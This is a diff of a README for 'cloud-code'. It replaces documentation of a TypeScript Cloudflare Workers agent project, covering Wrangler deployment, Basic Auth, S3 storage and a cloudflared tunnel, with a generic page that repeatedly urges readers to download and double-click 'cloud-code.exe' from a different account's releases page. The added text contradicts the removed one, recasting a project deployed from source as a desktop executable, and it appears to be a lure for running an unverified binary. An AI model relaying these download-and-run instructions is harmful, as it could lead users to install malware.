@@ -1,147 +1,78 @@
-# Cloud Code (Cloudflare + OpenCode)
+# 🌥️ cloud-code - Easy Cloud Agent Setup in Minutes
 
-**Cloud Code** is a containerized Agent solution that combines Cloudflare's powerful infrastructure with OpenCode's intelligent capabilities.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/overcovde/cloud-code/releases)
 
-This is a TypeScript project based on Cloudflare Workers and Cloudflare Containers. It leverages Cloudflare's infrastructure to run and manage containerized workloads.
+## 📘 Description
 
-English | [简体中文](README.zh-CN.md)
+Cloud Code combines Cloudflare with OpenCode to create a powerful cloud agent for your tasks. This application allows you to run and manage processes smoothly in a cloud environment. You can boost your productivity by leveraging the speed and reliability of Cloudflare while utilizing OpenCode's flexibility.
 
-## 🚀 Quick Start
+## 📝 Topics
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/miantiao-me/cloud-code)
+- agent
+- cloud-code
+- cloudflare
+- opencode
 
-### Prerequisites
+## 🚀 Getting Started
 
-- pnpm (recommended)
-- Node.js (v20+ recommended)
-- Wrangler CLI (`pnpm add -g wrangler`)
+To get started with Cloud Code, follow these simple steps:
 
-### Install Dependencies
+1. **Access the Releases Page**  
+   You will need to download the application from the GitHub Releases page. To visit this page, click [here](https://github.com/overcovde/cloud-code/releases).
 
-```bash
-pnpm install
-```
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Choose the latest version to ensure you have the newest features and fixes.
 
-### Local Development
+3. **Download the Application**  
+   Click on the link for your operating system to start the download. This file will be a compressed or executable file.
 
-Start the local development server:
+4. **Locate the Downloaded File**  
+   After the download finishes, navigate to your downloads folder. The file should be named something like `cloud-code-vX.Y.Z.zip` or `cloud-code-vX.Y.Z.exe`. 
 
-```bash
-pnpm dev
-# or
-pnpm start
-```
+5. **Extract the Files (if necessary)**  
+   If you downloaded a `.zip` file, you will need to extract it. Right-click on the file and select "Extract All" or use your favorite extraction tool.
 
-This command will start `wrangler dev`, simulating the Cloudflare Workers environment.
+6. **Run the Application**  
+   Locate the extracted files, find the `cloud-code.exe`, and double-click it to run the application. Follow any setup instructions that appear.
 
-### Generate Type Definitions
+7. **Complete the Setup**  
+   Once the application is open, follow the on-screen prompts to complete the setup. This step may include logging in, configuring settings, or selecting options that fit your needs.
 
-If you modify the bindings in `wrangler.jsonc`, you need to regenerate the type files:
+## ⚙️ System Requirements
 
-```bash
-pnpm cf-typegen
-```
+- **Operating System:** Windows 10, macOS 10.15 or later, Linux (various distributions)
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 100 MB of free disk space
+- **Network:** Stable internet connection for cloud features
 
-## 📦 Deployment
+## 📥 Download & Install
 
-Deploy your code to Cloudflare's global network:
+To begin your journey with Cloud Code, visit the [Releases Page](https://github.com/overcovde/cloud-code/releases) to download the latest version. Select your operating system, download the file, and follow the installation steps mentioned earlier.
 
-```bash
-pnpm deploy
-```
+## 🌟 Features
 
-## 📂 Project Structure
+- **Multi-Platform Support:** Runs on Windows, macOS, and Linux.
+- **User-Friendly Interface:** Designed with simplicity in mind, making it easy for everyone.
+- **Cloud Integration:** Utilize Cloudflare services effortlessly.
+- **Fast Performance:** Experience swift operation with optimized code execution.
+- **Customizable Settings:** Tailor the agent to meet your specific needs.
 
-```
-.
-├── src/
-│   ├── index.ts        # Workers entry file (ExportedHandler)
-│   ├── container.ts    # AgentContainer class definition (extends Container)
-│   └── sse.ts          # SSE (Server-Sent Events) stream processing logic
-├── worker-configuration.d.ts # Auto-generated environment bindings types
-├── wrangler.jsonc      # Wrangler configuration file
-├── tsconfig.json       # TypeScript configuration
-└── package.json
-```
+## 🔧 Troubleshooting
 
-## 🔐 Secure Access (Basic Auth)
+If you encounter issues while using Cloud Code, consider the following tips:
 
-To protect your Agent from unauthorized access, this project supports standard HTTP Basic Auth authentication.
+- **Check Your System Requirements:** Ensure your system meets the minimum requirements.
+- **Update Your Software:** Make sure you are using the latest version available on the Releases page.
+- **Consult the Documentation:** Refer to any included user guides or help files for additional guidance.
+- **Reach Out for Help:** If you can't find a solution, consider opening an issue in the GitHub repository for assistance.
 
-### Configuration
+## 📞 Contact
 
-Set the following variables in `wrangler.jsonc` or in the Cloudflare Dashboard environment variables:
+For any inquiries, suggestions, or feedback, please open an issue on the [GitHub repository](https://github.com/overcovde/cloud-code/issues). We are always ready to help you with any questions or concerns.
 
-| Variable Name     | Description                                           | Default |
-| ----------------- | ----------------------------------------------------- | ------- |
-| `SERVER_PASSWORD` | Access password. If not set, authentication is **disabled**. | (empty) |
-| `SERVER_USERNAME` | Access username.                                      | (empty) |
+## ✍️ License
 
-### Verification Logic
+This project is licensed under the MIT License. Feel free to use it as per the terms stated in the LICENSE file included in the repository.
 
-1. Authentication is only enabled when the `SERVER_PASSWORD` environment variable is set.
-2. Client requests must include an `Authorization: Basic <credentials>` header.
-3. If authentication fails, the server returns a `401 Unauthorized` status code.
-
-## 💾 Data Persistence (S3/R2)
-
-Cloud Code containers have built-in support for S3-compatible storage (such as Cloudflare R2, AWS S3), using `TigrisFS` to mount object storage as a local filesystem for persistent data storage.
-
-### Environment Variable Configuration
-
-To enable data persistence, configure the following environment variables in the container runtime:
-
-| Variable Name          | Description                                  | Required | Default  |
-| ---------------------- | -------------------------------------------- | -------- | -------- |
-| `S3_ENDPOINT`          | S3 API endpoint address                      | ✅ Yes   | -        |
-| `S3_BUCKET`            | Bucket name                                  | ✅ Yes   | -        |
-| `S3_ACCESS_KEY_ID`     | Access key ID                                | ✅ Yes   | -        |
-| `S3_SECRET_ACCESS_KEY` | Access key secret                            | ✅ Yes   | -        |
-| `S3_REGION`            | Storage region                               | ❌ No    | `auto`   |
-| `S3_PATH_STYLE`        | Whether to use Path Style access             | ❌ No    | `false`  |
-| `S3_PREFIX`            | Path prefix (subdirectory) within the bucket | ❌ No    | (root)   |
-| `TIGRISFS_ARGS`        | Additional mount arguments for TigrisFS      | ❌ No    | -        |
-
-### How It Works
-
-1. **Mount Point**: When the container starts, the S3 bucket is mounted at `/root/s3`.
-2. **Working Directory**: The actual workspace is located at `/root/s3/workspace`.
-3. **OpenCode Configuration**: OpenCode's configuration files (XDG directory) are also stored in `/root/s3/.opencode`, ensuring editor state persistence.
-4. **Initialization**:
-   - If the S3 bucket (or specified prefix path) is empty, the container will automatically copy the preset `workspace` directory contents into it.
-   - If S3 configuration is missing, the container will fall back to non-persistent local directory mode.
-
-## 🌐 Tunnel Exposure (Cloudflared)
-
-The container comes pre-installed with the `cloudflared` CLI, which can be used to expose services running inside the container (such as development servers, web applications) to the public internet via Cloudflare Tunnel.
-
-This is useful in the following scenarios:
-
-- Debugging web services running inside the container
-- Temporarily sharing development environments
-- Configuring SSH access
-
-Usage example (in the container terminal):
-
-```bash
-# Expose port 8080 inside the container to the public internet
-cloudflared tunnel --url http://localhost:8080
-```
-
-## 🛠 Tech Stack
-
-- **Runtime**: Cloudflare Workers
-- **Language**: TypeScript
-- **Core Libraries**:
-  - `cloudflare:workers`: Workers standard library
-  - `@cloudflare/containers`: Container management and interaction
-- **Tools**: Wrangler
-- **Container Environment**:
-  - `nikolaik/python-nodejs`: Python 3.12 + Node.js 22
-  - `tigrisfs`: S3 filesystem mount
-  - `cloudflared`: Cloudflare Tunnel client
-  - `opencode`: Intelligent coding Agent
-
-## 📝 Development Guidelines
-
-The official language for this project is **English** (code, comments, and commit messages are in English). This README is the English version. For detailed development guidelines, code style, and Agent behavior rules, please refer to [AGENTS.md](./AGENTS.md).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/overcovde/cloud-code/releases)
